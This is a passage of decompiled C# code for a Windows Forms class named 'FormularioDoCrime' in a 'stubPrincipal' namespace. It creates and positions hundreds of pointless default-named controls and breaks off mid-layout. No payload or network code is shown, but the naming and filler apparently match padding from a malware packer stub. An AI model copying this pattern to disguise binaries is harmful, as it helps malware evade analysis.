using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My;

namespace stubPrincipal
{
	// Token: 0x0200000F RID: 15
	[DesignerGenerated]
	public class FormularioDoCrime : Form
	{
		// Token: 0x060008FE RID: 2302 RVA: 0x0002D83A File Offset: 0x0002BA3A
		public FormularioDoCrime()
		{
			base.Load += this.FormularioDoCrime_Load;
			this.InitializeComponent();
		}

		// Token: 0x060008FF RID: 2303 RVA: 0x0002D85C File Offset: 0x0002BA5C
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000900 RID: 2304 RVA: 0x0002D89C File Offset: 0x0002BA9C
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			this.CheckedListBox1 = new CheckedListBox();
			this.CheckedListBox2 = new CheckedListBox();
			this.DateTimePicker1 = new DateTimePicker();
			this.CheckedListBox3 = new CheckedListBox();
			this.ComboBox1 = new ComboBox();
			this.MaskedTextBox1 = new MaskedTextBox();
			this.PictureBox1 = new PictureBox();
			this.ProgressBar1 = new ProgressBar();
			this.NumericUpDown1 = new NumericUpDown();
			this.ToolTip1 = new ToolTip(this.components);
			this.PictureBox2 = new PictureBox();
			this.MonthCalendar1 = new MonthCalendar();
			this.DateTimePicker2 = new DateTimePicker();
			this.ListView1 = new ListView();
			this.Label1 = new Label();
			this.ComboBox2 = new ComboBox();
			this.PictureBox3 = new PictureBox();
			this.RadioButton1 = new RadioButton();
			this.RadioButton2 = new RadioButton();
			this.ToolTip2 = new ToolTip(this.components);
			this.TextBox1 = new TextBox();
			this.TreeView1 = new TreeView();
			this.WebBrowser1 = new WebBrowser();
			this.PictureBox4 = new PictureBox();
			this.NumericUpDown2 = new NumericUpDown();
			this.MaskedTextBox2 = new MaskedTextBox();
			this.MaskedTextBox3 = new MaskedTextBox();
			this.NumericUpDown3 = new NumericUpDown();
			this.PictureBox5 = new PictureBox();
			this.WebBrowser2 = new WebBrowser();
			this.TreeView2 = new TreeView();
			this.TextBox2 = new TextBox();
			this.RadioButton3 = new RadioButton();
			this.RadioButton4 = new RadioButton();
			this.PictureBox6 = new PictureBox();
			this.ComboBox3 = new ComboBox();
			this.Label2 = new Label();
			this.ListView2 = new ListView();
			this.DateTimePicker3 = new DateTimePicker();
			this.MonthCalendar2 = new MonthCalendar();
			this.PictureBox7 = new PictureBox();
			this.NumericUpDown4 = new NumericUpDown();
			this.ProgressBar2 = new ProgressBar();
			this.PictureBox8 = new PictureBox();
			this.MaskedTextBox4 = new MaskedTextBox();
			this.ComboBox4 = new ComboBox();
			this.CheckedListBox4 = new CheckedListBox();
			this.DateTimePicker4 = new DateTimePicker();
			this.CheckedListBox5 = new CheckedListBox();
			this.CheckedListBox6 = new CheckedListBox();
			this.MaskedTextBox5 = new MaskedTextBox();
			this.NumericUpDown5 = new NumericUpDown();
			this.PictureBox9 = new PictureBox();
			this.WebBrowser3 = new WebBrowser();
			this.TreeView3 = new TreeView();
			this.TextBox3 = new TextBox();
			this.RadioButton5 = new RadioButton();
			this.RadioButton6 = new RadioButton();
			this.PictureBox10 = new PictureBox();
			this.ComboBox5 = new ComboBox();
			this.Label3 = new Label();
			this.ListView3 = new ListView();
			this.DateTimePicker5 = new DateTimePicker();
			this.MonthCalendar3 = new MonthCalendar();
			this.PictureBox11 = new PictureBox();
			this.NumericUpDown6 = new NumericUpDown();
			this.ProgressBar3 = new ProgressBar();
			this.PictureBox12 = new PictureBox();
			this.MaskedTextBox6 = new MaskedTextBox();
			this.ComboBox6 = new ComboBox();
			this.CheckedListBox7 = new CheckedListBox();
			this.DateTimePicker6 = new DateTimePicker();
			this.CheckedListBox8 = new CheckedListBox();
			this.CheckedListBox9 = new CheckedListBox();
			this.MaskedTextBox7 = new MaskedTextBox();
			this.NumericUpDown7 = new NumericUpDown();
			this.PictureBox13 = new PictureBox();
			this.WebBrowser4 = new WebBrowser();
			this.TreeView4 = new TreeView();
			this.TextBox4 = new TextBox();
			this.RadioButton7 = new RadioButton();
			this.RadioButton8 = new RadioButton();
			this.PictureBox14 = new PictureBox();
			this.ComboBox7 = new ComboBox();
			this.Label4 = new Label();
			this.ListView4 = new ListView();
			this.DateTimePicker7 = new DateTimePicker();
			this.MonthCalendar4 = new MonthCalendar();
			this.PictureBox15 = new PictureBox();
			this.NumericUpDown8 = new NumericUpDown();
			this.ProgressBar4 = new ProgressBar();
			this.PictureBox16 = new PictureBox();
			this.MaskedTextBox8 = new MaskedTextBox();
			this.ComboBox8 = new ComboBox();
			this.CheckedListBox10 = new CheckedListBox();
			this.DateTimePicker8 = new DateTimePicker();
			this.CheckedListBox11 = new CheckedListBox();
			this.CheckedListBox12 = new CheckedListBox();
			this.MaskedTextBox9 = new MaskedTextBox();
			this.NumericUpDown9 = new NumericUpDown();
			this.PictureBox17 = new PictureBox();
			this.WebBrowser5 = new WebBrowser();
			this.TreeView5 = new TreeView();
			this.TextBox5 = new TextBox();
			this.RadioButton9 = new RadioButton();
			this.RadioButton10 = new RadioButton();
			this.PictureBox18 = new PictureBox();
			this.ComboBox9 = new ComboBox();
			this.Label5 = new Label();
			this.ListView5 = new ListView();
			this.DateTimePicker9 = new DateTimePicker();
			this.MonthCalendar5 = new MonthCalendar();
			this.PictureBox19 = new PictureBox();
			this.NumericUpDown10 = new NumericUpDown();
			this.ProgressBar5 = new ProgressBar();
			this.PictureBox20 = new PictureBox();
			this.MaskedTextBox10 = new MaskedTextBox();
			this.ComboBox10 = new ComboBox();
			this.CheckedListBox13 = new CheckedListBox();
			this.DateTimePicker10 = new DateTimePicker();
			this.CheckedListBox14 = new CheckedListBox();
			this.CheckedListBox15 = new CheckedListBox();
			this.MaskedTextBox11 = new MaskedTextBox();
			this.NumericUpDown11 = new NumericUpDown();
			this.PictureBox21 = new PictureBox();
			this.WebBrowser6 = new WebBrowser();
			this.TreeView6 = new TreeView();
			this.TextBox6 = new TextBox();
			this.RadioButton11 = new RadioButton();
			this.RadioButton12 = new RadioButton();
			this.PictureBox22 = new PictureBox();
			this.ComboBox11 = new ComboBox();
			this.Label6 = new Label();
			this.ListView6 = new ListView();
			this.DateTimePicker11 = new DateTimePicker();
			this.MonthCalendar6 = new MonthCalendar();
			this.PictureBox23 = new PictureBox();
			this.NumericUpDown12 = new NumericUpDown();
			this.ProgressBar6 = new ProgressBar();
			this.PictureBox24 = new PictureBox();
			this.MaskedTextBox12 = new MaskedTextBox();
			this.ComboBox12 = new ComboBox();
			this.CheckedListBox16 = new CheckedListBox();
			this.DateTimePicker12 = new DateTimePicker();
			this.CheckedListBox17 = new CheckedListBox();
			this.CheckedListBox18 = new CheckedListBox();
			this.MaskedTextBox13 = new MaskedTextBox();
			this.NumericUpDown13 = new NumericUpDown();
			this.PictureBox25 = new PictureBox();
			this.WebBrowser7 = new WebBrowser();
			this.TreeView7 = new TreeView();
			this.TextBox7 = new TextBox();
			this.RadioButton13 = new RadioButton();
			this.RadioButton14 = new RadioButton();
			this.PictureBox26 = new PictureBox();
			this.ComboBox13 = new ComboBox();
			this.Label7 = new Label();
			this.ListView7 = new ListView();
			this.DateTimePicker13 = new DateTimePicker();
			this.MonthCalendar7 = new MonthCalendar();
			this.PictureBox27 = new PictureBox();
			this.NumericUpDown14 = new NumericUpDown();
			this.ProgressBar7 = new ProgressBar();
			this.PictureBox28 = new PictureBox();
			this.MaskedTextBox14 = new MaskedTextBox();
			this.ComboBox14 = new ComboBox();
			this.CheckedListBox19 = new CheckedListBox();
			this.DateTimePicker14 = new DateTimePicker();
			this.CheckedListBox20 = new CheckedListBox();
			this.CheckedListBox21 = new CheckedListBox();
			this.MaskedTextBox15 = new MaskedTextBox();
			this.NumericUpDown15 = new NumericUpDown();
			this.PictureBox29 = new PictureBox();
			this.WebBrowser8 = new WebBrowser();
			this.TreeView8 = new TreeView();
			this.TextBox8 = new TextBox();
			this.RadioButton15 = new RadioButton();
			this.RadioButton16 = new RadioButton();
			this.PictureBox30 = new PictureBox();
			this.ComboBox15 = new ComboBox();
			this.Label8 = new Label();
			this.ListView8 = new ListView();
			this.DateTimePicker15 = new DateTimePicker();
			this.MonthCalendar8 = new MonthCalendar();
			this.PictureBox31 = new PictureBox();
			this.NumericUpDown16 = new NumericUpDown();
			this.ProgressBar8 = new ProgressBar();
			this.PictureBox32 = new PictureBox();
			this.MaskedTextBox16 = new MaskedTextBox();
			this.ComboBox16 = new ComboBox();
			this.CheckedListBox22 = new CheckedListBox();
			this.DateTimePicker16 = new DateTimePicker();
			this.CheckedListBox23 = new CheckedListBox();
			this.CheckedListBox24 = new CheckedListBox();
			this.NumericUpDown17 = new NumericUpDown();
			this.PictureBox33 = new PictureBox();
			this.WebBrowser9 = new WebBrowser();
			this.TreeView9 = new TreeView();
			this.TextBox9 = new TextBox();
			this.RadioButton17 = new RadioButton();
			this.RadioButton18 = new RadioButton();
			this.PictureBox34 = new PictureBox();
			this.ComboBox17 = new ComboBox();
			this.Label9 = new Label();
			this.ListView9 = new ListView();
			this.DateTimePicker17 = new DateTimePicker();
			this.MonthCalendar9 = new MonthCalendar();
			this.PictureBox35 = new PictureBox();
			this.NumericUpDown18 = new NumericUpDown();
			this.ProgressBar9 = new ProgressBar();
			this.PictureBox36 = new PictureBox();
			this.MaskedTextBox17 = new MaskedTextBox();
			this.ComboBox18 = new ComboBox();
			this.CheckedListBox25 = new CheckedListBox();
			this.DateTimePicker18 = new DateTimePicker();
			this.CheckedListBox26 = new CheckedListBox();
			this.CheckedListBox27 = new CheckedListBox();
			this.MaskedTextBox18 = new MaskedTextBox();
			this.NumericUpDown19 = new NumericUpDown();
			this.PictureBox37 = new PictureBox();
			this.WebBrowser10 = new WebBrowser();
			this.TreeView10 = new TreeView();
			this.TextBox10 = new TextBox();
			this.RadioButton19 = new RadioButton();
			this.RadioButton20 = new RadioButton();
			this.PictureBox38 = new PictureBox();
			this.ComboBox19 = new ComboBox();
			this.Label10 = new Label();
			this.ListView10 = new ListView();
			this.DateTimePicker19 = new DateTimePicker();
			this.MonthCalendar10 = new MonthCalendar();
			this.PictureBox39 = new PictureBox();
			this.NumericUpDown20 = new NumericUpDown();
			this.ProgressBar10 = new ProgressBar();
			this.PictureBox40 = new PictureBox();
			this.MaskedTextBox19 = new MaskedTextBox();
			this.ComboBox20 = new ComboBox();
			this.CheckedListBox28 = new CheckedListBox();
			this.DateTimePicker20 = new DateTimePicker();
			this.CheckedListBox29 = new CheckedListBox();
			this.CheckedListBox30 = new CheckedListBox();
			this.MaskedTextBox20 = new MaskedTextBox();
			this.NumericUpDown21 = new NumericUpDown();
			this.PictureBox41 = new PictureBox();
			this.WebBrowser11 = new WebBrowser();
			this.TreeView11 = new TreeView();
			this.TextBox11 = new TextBox();
			this.RadioButton21 = new RadioButton();
			this.RadioButton22 = new RadioButton();
			this.PictureBox42 = new PictureBox();
			this.ComboBox21 = new ComboBox();
			this.Label11 = new Label();
			this.ListView11 = new ListView();
			this.DateTimePicker21 = new DateTimePicker();
			this.MonthCalendar11 = new MonthCalendar();
			this.PictureBox43 = new PictureBox();
			this.NumericUpDown22 = new NumericUpDown();
			this.ProgressBar11 = new ProgressBar();
			this.PictureBox44 = new PictureBox();
			this.MaskedTextBox21 = new MaskedTextBox();
			this.ComboBox22 = new ComboBox();
			this.CheckedListBox31 = new CheckedListBox();
			this.DateTimePicker22 = new DateTimePicker();
			this.CheckedListBox32 = new CheckedListBox();
			this.CheckedListBox33 = new CheckedListBox();
			this.MaskedTextBox22 = new MaskedTextBox();
			this.NumericUpDown23 = new NumericUpDown();
			this.PictureBox45 = new PictureBox();
			this.WebBrowser12 = new WebBrowser();
			this.TreeView12 = new TreeView();
			this.TextBox12 = new TextBox();
			this.RadioButton23 = new RadioButton();
			this.RadioButton24 = new RadioButton();
			this.PictureBox46 = new PictureBox();
			this.ComboBox23 = new ComboBox();
			this.Label12 = new Label();
			this.ListView12 = new ListView();
			this.DateTimePicker23 = new DateTimePicker();
			this.MonthCalendar12 = new MonthCalendar();
			this.PictureBox47 = new PictureBox();
			this.NumericUpDown24 = new NumericUpDown();
			this.ProgressBar12 = new ProgressBar();
			this.PictureBox48 = new PictureBox();
			this.MaskedTextBox23 = new MaskedTextBox();
			this.ComboBox24 = new ComboBox();
			this.CheckedListBox34 = new CheckedListBox();
			this.DateTimePicker24 = new DateTimePicker();
			this.CheckedListBox35 = new CheckedListBox();
			this.CheckedListBox36 = new CheckedListBox();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			((ISupportInitialize)this.NumericUpDown1).BeginInit();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			((ISupportInitialize)this.PictureBox3).BeginInit();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			((ISupportInitialize)this.NumericUpDown2).BeginInit();
			((ISupportInitialize)this.NumericUpDown3).BeginInit();
			((ISupportInitialize)this.PictureBox5).BeginInit();
			((ISupportInitialize)this.PictureBox6).BeginInit();
			((ISupportInitialize)this.PictureBox7).BeginInit();
			((ISupportInitialize)this.NumericUpDown4).BeginInit();
			((ISupportInitialize)this.PictureBox8).BeginInit();
			((ISupportInitialize)this.NumericUpDown5).BeginInit();
			((ISupportInitialize)this.PictureBox9).BeginInit();
			((ISupportInitialize)this.PictureBox10).BeginInit();
			((ISupportInitialize)this.PictureBox11).BeginInit();
			((ISupportInitialize)this.NumericUpDown6).BeginInit();
			((ISupportInitialize)this.PictureBox12).BeginInit();
			((ISupportInitialize)this.NumericUpDown7).BeginInit();
			((ISupportInitialize)this.PictureBox13).BeginInit();
			((ISupportInitialize)this.PictureBox14).BeginInit();
			((ISupportInitialize)this.PictureBox15).BeginInit();
			((ISupportInitialize)this.NumericUpDown8).BeginInit();
			((ISupportInitialize)this.PictureBox16).BeginInit();
			((ISupportInitialize)this.NumericUpDown9).BeginInit();
			((ISupportInitialize)this.PictureBox17).BeginInit();
			((ISupportInitialize)this.PictureBox18).BeginInit();
			((ISupportInitialize)this.PictureBox19).BeginInit();
			((ISupportInitialize)this.NumericUpDown10).BeginInit();
			((ISupportInitialize)this.PictureBox20).BeginInit();
			((ISupportInitialize)this.NumericUpDown11).BeginInit();
			((ISupportInitialize)this.PictureBox21).BeginInit();
			((ISupportInitialize)this.PictureBox22).BeginInit();
			((ISupportInitialize)this.PictureBox23).BeginInit();
			((ISupportInitialize)this.NumericUpDown12).BeginInit();
			((ISupportInitialize)this.PictureBox24).BeginInit();
			((ISupportInitialize)this.NumericUpDown13).BeginInit();
			((ISupportInitialize)this.PictureBox25).BeginInit();
			((ISupportInitialize)this.PictureBox26).BeginInit();
			((ISupportInitialize)this.PictureBox27).BeginInit();
			((ISupportInitialize)this.NumericUpDown14).BeginInit();
			((ISupportInitialize)this.PictureBox28).BeginInit();
			((ISupportInitialize)this.NumericUpDown15).BeginInit();
			((ISupportInitialize)this.PictureBox29).BeginInit();
			((ISupportInitialize)this.PictureBox30).BeginInit();
			((ISupportInitialize)this.PictureBox31).BeginInit();
			((ISupportInitialize)this.NumericUpDown16).BeginInit();
			((ISupportInitialize)this.PictureBox32).BeginInit();
			((ISupportInitialize)this.NumericUpDown17).BeginInit();
			((ISupportInitialize)this.PictureBox33).BeginInit();
			((ISupportInitialize)this.PictureBox34).BeginInit();
			((ISupportInitialize)this.PictureBox35).BeginInit();
			((ISupportInitialize)this.NumericUpDown18).BeginInit();
			((ISupportInitialize)this.PictureBox36).BeginInit();
			((ISupportInitialize)this.NumericUpDown19).BeginInit();
			((ISupportInitialize)this.PictureBox37).BeginInit();
			((ISupportInitialize)this.PictureBox38).BeginInit();
			((ISupportInitialize)this.PictureBox39).BeginInit();
			((ISupportInitialize)this.NumericUpDown20).BeginInit();
			((ISupportInitialize)this.PictureBox40).BeginInit();
			((ISupportInitialize)this.NumericUpDown21).BeginInit();
			((ISupportInitialize)this.PictureBox41).BeginInit();
			((ISupportInitialize)this.PictureBox42).BeginInit();
			((ISupportInitialize)this.PictureBox43).BeginInit();
			((ISupportInitialize)this.NumericUpDown22).BeginInit();
			((ISupportInitialize)this.PictureBox44).BeginInit();
			((ISupportInitialize)this.NumericUpDown23).BeginInit();
			((ISupportInitialize)this.PictureBox45).BeginInit();
			((ISupportInitialize)this.PictureBox46).BeginInit();
			((ISupportInitialize)this.PictureBox47).BeginInit();
			((ISupportInitialize)this.NumericUpDown24).BeginInit();
			((ISupportInitialize)this.PictureBox48).BeginInit();
			base.SuspendLayout();
			this.CheckedListBox1.FormattingEnabled = true;
			this.CheckedListBox1.Location = new Point(164, 154);
			this.CheckedListBox1.Name = "CheckedListBox1";
			this.CheckedListBox1.Size = new Size(310, 64);
			this.CheckedListBox1.TabIndex = 0;
			this.CheckedListBox2.FormattingEnabled = true;
			this.CheckedListBox2.Location = new Point(231, 45);
			this.CheckedListBox2.Name = "CheckedListBox2";
			this.CheckedListBox2.Size = new Size(90, 19);
			this.CheckedListBox2.TabIndex = 1;
			this.DateTimePicker1.Location = new Point(159, 91);
			this.DateTimePicker1.Name = "DateTimePicker1";
			this.DateTimePicker1.Size = new Size(91, 20);
			this.DateTimePicker1.TabIndex = 2;
			this.CheckedListBox3.FormattingEnabled = true;
			this.CheckedListBox3.Location = new Point(257, 102);
			this.CheckedListBox3.Name = "CheckedListBox3";
			this.CheckedListBox3.Size = new Size(174, 4);
			this.CheckedListBox3.TabIndex = 3;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Location = new Point(507, 112);
			this.ComboBox1.Name = "ComboBox1";
			this.ComboBox1.Size = new Size(118, 21);
			this.ComboBox1.TabIndex = 4;
			this.MaskedTextBox1.Location = new Point(184, 266);
			this.MaskedTextBox1.Name = "MaskedTextBox1";
			this.MaskedTextBox1.Size = new Size(154, 20);
			this.MaskedTextBox1.TabIndex = 5;
			this.PictureBox1.Location = new Point(437, 239);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new Size(249, 71);
			this.PictureBox1.TabIndex = 6;
			this.PictureBox1.TabStop = false;
			this.ProgressBar1.Location = new Point(27, 9);
			this.ProgressBar1.Name = "ProgressBar1";
			this.ProgressBar1.Size = new Size(36, 75);
			this.ProgressBar1.TabIndex = 7;
			this.NumericUpDown1.Location = new Point(80, 247);
			this.NumericUpDown1.Name = "NumericUpDown1";
			this.NumericUpDown1.Size = new Size(38, 20);
			this.NumericUpDown1.TabIndex = 8;
			this.PictureBox2.Location = new Point(317, 45);
			this.PictureBox2.Name = "PictureBox2";
			this.PictureBox2.Size = new Size(201, 91);
			this.PictureBox2.TabIndex = 9;
			this.PictureBox2.TabStop = false;
			this.MonthCalendar1.Location = new Point(452, 121);
			this.MonthCalendar1.Name = "MonthCalendar1";
			this.MonthCalendar1.TabIndex = 10;
			this.DateTimePicker2.Location = new Point(257, 63);
			this.DateTimePicker2.Name = "DateTimePicker2";
			this.DateTimePicker2.Size = new Size(200, 20);
			this.DateTimePicker2.TabIndex = 11;
			this.ListView1.HideSelection = false;
			this.ListView1.Location = new Point(11, 82);
			this.ListView1.Name = "ListView1";
			this.ListView1.Size = new Size(173, 27);
			this.ListView1.TabIndex = 12;
			this.ListView1.UseCompatibleStateImageBehavior = false;
			this.Label1.AutoSize = true;
			this.Label1.Location = new Point(54, 163);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(39, 13);
			this.Label1.TabIndex = 13;
			this.Label1.Text = "Label1";
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Location = new Point(158, 135);
			this.ComboBox2.Name = "ComboBox2";
			this.ComboBox2.Size = new Size(146, 21);
			this.ComboBox2.TabIndex = 14;
			this.PictureBox3.Location = new Point(206, 135);
			this.PictureBox3.Name = "PictureBox3";
			this.PictureBox3.Size = new Size(97, 86);
			this.PictureBox3.TabIndex = 15;
			this.PictureBox3.TabStop = false;
			this.RadioButton1.AutoSize = true;
			this.RadioButton1.Location = new Point(62, 154);
			this.RadioButton1.Name = "RadioButton1";
			this.RadioButton1.Size = new Size(90, 17);
			this.RadioButton1.TabIndex = 16;
			this.RadioButton1.TabStop = true;
			this.RadioButton1.Text = "RadioButton1";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Location = new Point(461, 121);
			this.RadioButton2.Name = "RadioButton2";
			this.RadioButton2.Size = new Size(90, 17);
			this.RadioButton2.TabIndex = 17;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "RadioButton2";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.TextBox1.Location = new Point(349, 198);
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.Size = new Size(107, 20);
			this.TextBox1.TabIndex = 18;
			this.TreeView1.Location = new Point(302, 230);
			this.TreeView1.Name = "TreeView1";
			this.TreeView1.Size = new Size(135, 50);
			this.TreeView1.TabIndex = 19;
			this.WebBrowser1.Location = new Point(550, 9);
			this.WebBrowser1.MinimumSize = new Size(20, 20);
			this.WebBrowser1.Name = "WebBrowser1";
			this.WebBrowser1.Size = new Size(171, 90);
			this.WebBrowser1.TabIndex = 20;
			this.PictureBox4.Location = new Point(137, 14);
			this.PictureBox4.Name = "PictureBox4";
			this.PictureBox4.Size = new Size(94, 31);
			this.PictureBox4.TabIndex = 21;
			this.PictureBox4.TabStop = false;
			this.NumericUpDown2.Location = new Point(685, 135);
			this.NumericUpDown2.Name = "NumericUpDown2";
			this.NumericUpDown2.Size = new Size(84, 20);
			this.NumericUpDown2.TabIndex = 22;
			this.MaskedTextBox2.Location = new Point(727, 214);
			this.MaskedTextBox2.Name = "MaskedTextBox2";
			this.MaskedTextBox2.Size = new Size(41, 20);
			this.MaskedTextBox2.TabIndex = 23;
			this.MaskedTextBox3.Location = new Point(737, 258);
			this.MaskedTextBox3.Name = "MaskedTextBox3";
			this.MaskedTextBox3.Size = new Size(41, 20);
			this.MaskedTextBox3.TabIndex = 47;
			this.NumericUpDown3.Location = new Point(695, 179);
			this.NumericUpDown3.Name = "NumericUpDown3";
			this.NumericUpDown3.Size = new Size(84, 20);
			this.NumericUpDown3.TabIndex = 46;
			this.PictureBox5.Location = new Point(147, 58);
			this.PictureBox5.Name = "PictureBox5";
			this.PictureBox5.Size = new Size(94, 31);
			this.PictureBox5.TabIndex = 45;
			this.PictureBox5.TabStop = false;
			this.WebBrowser2.Location = new Point(560, 53);
			this.WebBrowser2.MinimumSize = new Size(20, 20);
			this.WebBrowser2.Name = "WebBrowser2";
			this.WebBrowser2.Size = new Size(171, 90);
			this.WebBrowser2.TabIndex = 44;
			this.TreeView2.Location = new Point(312, 274);
			this.TreeView2.Name = "TreeView2";
			this.TreeView2.Size = new Size(135, 50);
			this.TreeView2.TabIndex = 43;
			this.TextBox2.Location = new Point(359, 242);
			this.TextBox2.Name = "TextBox2";
			this.TextBox2.Size = new Size(107, 20);
			this.TextBox2.TabIndex = 42;
			this.RadioButton3.AutoSize = true;
			this.RadioButton3.Location = new Point(471, 165);
			this.RadioButton3.Name = "RadioButton3";
			this.RadioButton3.Size = new Size(90, 17);
			this.RadioButton3.TabIndex = 41;
			this.RadioButton3.TabStop = true;
			this.RadioButton3.Text = "RadioButton3";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Location = new Point(72, 198);
			this.RadioButton4.Name = "RadioButton4";
			this.RadioButton4.Size = new Size(90, 17);
			this.RadioButton4.TabIndex = 40;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "RadioButton4";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.PictureBox6.Location = new Point(216, 179);
			this.PictureBox6.Name = "PictureBox6";
			this.PictureBox6.Size = new Size(97, 86);
			this.PictureBox6.TabIndex = 39;
			this.PictureBox6.TabStop = false;
			this.ComboBox3.FormattingEnabled = true;
			this.ComboBox3.Location = new Point(168, 179);
			this.ComboBox3.Name = "ComboBox3";
			this.ComboBox3.Size = new Size(146, 21);
			this.ComboBox3.TabIndex = 38;
			this.Label2.AutoSize = true;
			this.Label2.Location = new Point(64, 207);
			this.Label2.Name = "Label2";
			this.Label2.Size = new Size(39, 13);
			this.Label2.TabIndex = 37;
			this.Label2.Text = "Label2";
			this.ListView2.HideSelection = false;
			this.ListView2.Location = new Point(21, 126);
			this.ListView2.Name = "ListView2";
			this.ListView2.Size = new Size(173, 27);
			this.ListView2.TabIndex = 36;
			this.ListView2.UseCompatibleStateImageBehavior = false;
			this.DateTimePicker3.Location = new Point(267, 107);
			this.DateTimePicker3.Name = "DateTimePicker3";
			this.DateTimePicker3.Size = new Size(200, 20);
			this.DateTimePicker3.TabIndex = 35;
			this.MonthCalendar2.Location = new Point(462, 165);
			this.MonthCalendar2.Name = "MonthCalendar2";
			this.MonthCalendar2.TabIndex = 34;
			this.PictureBox7.Location = new Point(327, 89);
			this.PictureBox7.Name = "PictureBox7";
			this.PictureBox7.Size = new Size(201, 91);
			this.PictureBox7.TabIndex = 33;
			this.PictureBox7.TabStop = false;
			this.NumericUpDown4.Location = new Point(90, 291);
			this.NumericUpDown4.Name = "NumericUpDown4";
			this.NumericUpDown4.Size = new Size(38, 20);
			this.NumericUpDown4.TabIndex = 32;
			this.ProgressBar2.Location = new Point(37, 53);
			this.ProgressBar2.Name = "ProgressBar2";
			this.ProgressBar2.Size = new Size(36, 75);
			this.ProgressBar2.TabIndex = 31;
			this.PictureBox8.Location = new Point(447, 283);
			this.PictureBox8.Name = "PictureBox8";
			this.PictureBox8.Size = new Size(249, 71);
			this.PictureBox8.TabIndex = 30;
			this.PictureBox8.TabStop = false;
			this.MaskedTextBox4.Location = new Point(194, 310);
			this.MaskedTextBox4.Name = "MaskedTextBox4";
			this.MaskedTextBox4.Size = new Size(154, 20);
			this.MaskedTextBox4.TabIndex = 29;
			this.ComboBox4.FormattingEnabled = true;
			this.ComboBox4.Location = new Point(517, 156);
			this.ComboBox4.Name = "ComboBox4";
			this.ComboBox4.Size = new Size(118, 21);
			this.ComboBox4.TabIndex = 28;
			this.CheckedListBox4.FormattingEnabled = true;
			this.CheckedListBox4.Location = new Point(267, 146);
			this.CheckedListBox4.Name = "CheckedListBox4";
			this.CheckedListBox4.Size = new Size(174, 4);
			this.CheckedListBox4.TabIndex = 27;
			this.DateTimePicker4.Location = new Point(169, 135);
			this.DateTimePicker4.Name = "DateTimePicker4";
			this.DateTimePicker4.Size = new Size(91, 20);
			this.DateTimePicker4.TabIndex = 26;
			this.CheckedListBox5.FormattingEnabled = true;
			this.CheckedListBox5.Location = new Point(241, 89);
			this.CheckedListBox5.Name = "CheckedListBox5";
			this.CheckedListBox5.Size = new Size(90, 19);
			this.CheckedListBox5.TabIndex = 25;
			this.CheckedListBox6.FormattingEnabled = true;
			this.CheckedListBox6.Location = new Point(174, 198);
			this.CheckedListBox6.Name = "CheckedListBox6";
			this.CheckedListBox6.Size = new Size(310, 64);
			this.CheckedListBox6.TabIndex = 24;
			this.MaskedTextBox5.Location = new Point(745, 266);
			this.MaskedTextBox5.Name = "MaskedTextBox5";
			this.MaskedTextBox5.Size = new Size(41, 20);
			this.MaskedTextBox5.TabIndex = 71;
			this.NumericUpDown5.Location = new Point(703, 187);
			this.NumericUpDown5.Name = "NumericUpDown5";
			this.NumericUpDown5.Size = new Size(84, 20);
			this.NumericUpDown5.TabIndex = 70;
			this.PictureBox9.Location = new Point(155, 66);
			this.PictureBox9.Name = "PictureBox9";
			this.PictureBox9.Size = new Size(94, 31);
			this.PictureBox9.TabIndex = 69;
			this.PictureBox9.TabStop = false;
			this.WebBrowser3.Location = new Point(568, 61);
			this.WebBrowser3.MinimumSize = new Size(20, 20);
			this.WebBrowser3.Name = "WebBrowser3";
			this.WebBrowser3.Size = new Size(171, 90);
			this.WebBrowser3.TabIndex = 68;
			this.TreeView3.Location = new Point(320, 282);
			this.TreeView3.Name = "TreeView3";
			this.TreeView3.Size = new Size(135, 50);
			this.TreeView3.TabIndex = 67;
			this.TextBox3.Location = new Point(367, 250);
			this.TextBox3.Name = "TextBox3";
			this.TextBox3.Size = new Size(107, 20);
			this.TextBox3.TabIndex = 66;
			this.RadioButton5.AutoSize = true;
			this.RadioButton5.Location = new Point(479, 173);
			this.RadioButton5.Name = "RadioButton5";
			this.RadioButton5.Size = new Size(90, 17);
			this.RadioButton5.TabIndex = 65;
			this.RadioButton5.TabStop = true;
			this.RadioButton5.Text = "RadioButton5";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Location = new Point(80, 206);
			this.RadioButton6.Name = "RadioButton6";
			this.RadioButton6.Size = new Size(90, 17);
			this.RadioButton6.TabIndex = 64;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "RadioButton6";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.PictureBox10.Location = new Point(224, 187);
			this.PictureBox10.Name = "PictureBox10";
			this.PictureBox10.Size = new Size(97, 86);
			this.PictureBox10.TabIndex = 63;
			this.PictureBox10.TabStop = false;
			this.ComboBox5.FormattingEnabled = true;
			this.ComboBox5.Location = new Point(176, 187);
			this.ComboBox5.Name = "ComboBox5";
			this.ComboBox5.Size = new Size(146, 21);
			this.ComboBox5.TabIndex = 62;
			this.Label3.AutoSize = true;
			this.Label3.Location = new Point(72, 215);
			this.Label3.Name = "Label3";
			this.Label3.Size = new Size(39, 13);
			this.Label3.TabIndex = 61;
			this.Label3.Text = "Label3";
			this.ListView3.HideSelection = false;
			this.ListView3.Location = new Point(29, 134);
